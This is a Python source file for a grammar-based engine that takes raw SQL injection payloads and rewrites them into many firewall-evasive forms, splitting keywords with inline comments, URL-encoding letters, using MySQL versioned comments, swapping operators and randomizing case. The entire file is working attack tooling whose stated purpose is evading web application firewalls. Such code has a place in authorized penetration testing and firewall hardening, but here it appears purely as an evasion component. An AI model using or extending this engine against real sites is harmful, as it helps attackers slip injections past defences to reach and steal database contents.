import random
import re

class GrammarEngine:
    """
    A Custom Grammar Engine (BNF-inspired) for generating obfuscated SQL components.
    Instead of static strings, it expands rules into various WAF-evasive variations.
    """
    def __init__(self):
        # The Grammar Rules (BNF-like)
        # Each key is a non-terminal, each value is a list of potential expansions.
        self.rules = {
            "WHITESPACE": [
                " ", "/**/", "/*!*/", "%20", "%0a", "%0d", "%09", 
                "/*" + "".join(random.choices("abcdef", k=4)) + "*/",
                " " * random.randint(1, 4),
                "%0b", "/**/ /*!*/", "/*!50000 */"
            ],
            "OR": [" OR ", " || ", " XOR ", " or ", "||(SELECT 1)||", "||(true)||"],
            "AND": [" AND ", " && ", " and ", "&&(SELECT 1)&&", "&&(true)&&"],
            "SELECT": [
                "SELECT", "SEL/**/ECT", "S%45LECT", "/*!50000SELECT*/", 
                "SeLeCt", "(SELECT)", "/*!--+*/SELECT", "1.e(SELECT)",
                "SELECT DISTINCT", "SELECT ALL", "/*!12345SELECT*/"
            ],
            "UNION": [
                "UNION", "UNI/**/ON", "U%4eION", "/*!50000UNION*/", 
                "UnIoN", "(UNION)", "all union", "1.e(UNION)",
                "UNION SELECT", "UNION DISTINCT", "UNION ALL", "/*!12345UNION*/"
            ],
            "ORDER_BY": [
                " ORDER BY ", " ORDER/**/BY ", " OR%44ER BY ", "/*!50000ORDER BY*/",
                " oRdEr By ", "GROUP BY", " ORDER  BY "
            ],
            "FROM": [
                "FROM", "FR/**/OM", "F%52OM", "/*!50000FROM*/", 
                "FrOm", "(FROM)", "1.e(FROM)"
            ],
            "WHERE": [
                "WHERE", "WHE/**/RE", "W%48ERE", "/*!50000WHERE*/", 
                "WhErE", "(WHERE)", "1.e(WHERE)"
            ],
            "EQUALS": ["=", "<=>", " LIKE ", " IN ", " regexp ", "1.e('')="],
            "COMMA": [",", "/**/,/**/", "/*!,*/", "%2c", " 1.e,1.e "],
            "COMMENT_START": ["#", "-- ", "--+", "/*", "/*!", "/*!50000", ";%00", "/*!" + str(random.randint(30000, 60000))],
            "COMMENT_END": ["*/", "\x00", " -- -", " #"]
        }
        
    def expand(self, token, intensity=1):
        """
        Expands a token using the grammar rules. 
        If it's a known non-terminal, pick a variation.
        """
        token_upper = token.upper()
        
        # Exact match in rules
        if token_upper in self.rules:
            # High intensity = higher chance of complex obfuscation (non-index-0)
            variations = self.rules[token_upper]
            if intensity <= 1:
                # Mostly clean
                return random.choices(variations, weights=[10] + [1]*(len(variations)-1))[0]
            else:
                # More aggressive
                return random.choice(variations)
        
        # Dynamic keywords not explicitly in rules (Case randomization fallback)
        if len(token) > 2 and token.isalpha():
            return self._random_case_obfuscate(token)
            
        return token

    def _random_case_obfuscate(self, word):
        """Fallback: Randomly flip case for keywords."""
        if random.random() < 0.3:
            return "".join([c.upper() if random.random() > 0.5 else c.lower() for c in word])
        return word

    def obfuscate_query(self, query, intensity=2):
        """
        Takes a raw SQL string and applies the grammar rules to its components.
        Used to 'dress' a payload after mutations.
        """
        # Split by boundaries but preserve separators
        tokens = re.split(r"(\s+|[(),=<>!])", query)
        processed = []
        
        for tok in tokens:
            if not tok: continue
            
            # Map separators/keywords to rules
            if tok.isspace():
                processed.append(self.expand("WHITESPACE", intensity))
            elif tok == "=":
                processed.append(self.expand("EQUALS", intensity))
            elif tok == ",":
                processed.append(self.expand("COMMA", intensity))
            elif tok.upper() in self.rules:
                processed.append(self.expand(tok.upper(), intensity))
            else:
                # Check for dynamic randomization
                processed.append(self._random_case_obfuscate(tok))
                
        return "".join(processed)
